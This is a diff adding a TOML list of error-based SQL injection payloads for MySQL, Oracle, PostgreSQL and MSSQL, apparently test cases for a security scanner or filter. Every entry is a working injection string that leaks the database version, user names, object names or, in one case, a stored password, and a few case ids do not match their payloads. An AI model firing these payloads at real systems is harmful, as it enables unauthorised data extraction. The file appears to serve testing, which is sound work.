@@ -1,0 +1,122 @@
+schema = 1
+# Error-based SQLi: trigger DB errors that leak data.
+
+[[case]]
+id = "extractvalue_concat"
+class = "sql"
+payload = "' AND EXTRACTVALUE(1,CONCAT(0x5c,(SELECT version())))--"
+
+[[case]]
+id = "extractvalue_database"
+class = "sql"
+payload = "' AND EXTRACTVALUE(1,CONCAT(0x7e,database()))--"
+
+[[case]]
+id = "updatexml_user"
+class = "sql"
+payload = "' AND UPDATEXML(1,CONCAT(0x7e,user()),1)--"
+
+[[case]]
+id = "updatexml_subquery"
+class = "sql"
+payload = "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT password FROM users LIMIT 1)),1)--"
+
+[[case]]
+id = "exp_overflow"
+class = "sql"
+payload = "' AND EXP(~(SELECT * FROM (SELECT version())x))--"
+
+[[case]]
+id = "geometrycollection_overflow"
+class = "sql"
+payload = "' AND GEOMETRYCOLLECTION((SELECT * FROM (SELECT * FROM(SELECT user())a)b))--"
+
+[[case]]
+id = "polygon_overflow"
+class = "sql"
+payload = "' AND POLYGON((SELECT * FROM (SELECT * FROM(SELECT user())a)b))--"
+
+[[case]]
+id = "multipoint_overflow"
+class = "sql"
+payload = "' AND MULTIPOINT((SELECT * FROM (SELECT * FROM(SELECT user())a)b))--"
+
+[[case]]
+id = "linestring_overflow"
+class = "sql"
+payload = "' AND LINESTRING((SELECT * FROM (SELECT * FROM(SELECT user())a)b))--"
+
+[[case]]
+id = "name_const_collision"
+class = "sql"
+payload = "' AND NAME_CONST(version(),1) = NAME_CONST(version(),1)--"
+
+[[case]]
+id = "duplicate_group_count"
+class = "sql"
+payload = "' AND (SELECT COUNT(*) FROM (SELECT 1 UNION SELECT 2 UNION SELECT 3)x GROUP BY CONCAT(version(),FLOOR(RAND(0)*2)))--"
+
+[[case]]
+id = "rand_floor_concat"
+class = "sql"
+payload = "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--"
+
+[[case]]
+id = "convert_overflow"
+class = "sql"
+payload = "' AND CONVERT(int,@@version)--"
+
+[[case]]
+id = "cast_overflow"
+class = "sql"
+payload = "' AND CAST(@@version AS int)--"
+
+[[case]]
+id = "ctxsys_drithsx_oracle"
+class = "sql"
+payload = "' AND CTXSYS.DRITHSX.SN(user,(CHR(73)||CHR(83)))--"
+
+[[case]]
+id = "utl_inaddr_oracle"
+class = "sql"
+payload = "' AND UTL_INADDR.GET_HOST_ADDRESS((SELECT user FROM dual))--"
+
+[[case]]
+id = "ora_dml_lock"
+class = "sql"
+payload = "' AND DBMS_AQ.ENQUEUE((SELECT user FROM dual),NULL,NULL,NULL,NULL)--"
+
+[[case]]
+id = "xmltype_oracle"
+class = "sql"
+payload = "' AND XMLTYPE('<a:b xmlns:a=\"https://x/'||(SELECT user FROM dual)||'\"/>')--"
+
+[[case]]
+id = "convert_to_int_pg"
+class = "sql"
+payload = "' AND (SELECT CAST(version() AS int))--"
+
+[[case]]
+id = "to_char_pg"
+class = "sql"
+payload = "' AND TO_CHAR(1/0)--"
+
+[[case]]
+id = "json_each_pg"
+class = "sql"
+payload = "' AND (SELECT 1 FROM json_each_text((SELECT current_user::text)))--"
+
+[[case]]
+id = "implicit_conversion_mssql"
+class = "sql"
+payload = "' AND 1=CONVERT(int,@@version)--"
+
+[[case]]
+id = "openrowset_mssql"
+class = "sql"
+payload = "' AND 1=(SELECT TOP 1 name FROM sys.objects)--"
+
+[[case]]
+id = "row_number_mssql"
+class = "sql"
+payload = "' AND 1=(SELECT TOP 1 name FROM (SELECT name,ROW_NUMBER() OVER (ORDER BY name) AS r FROM sys.objects)x WHERE x.r=1)--"
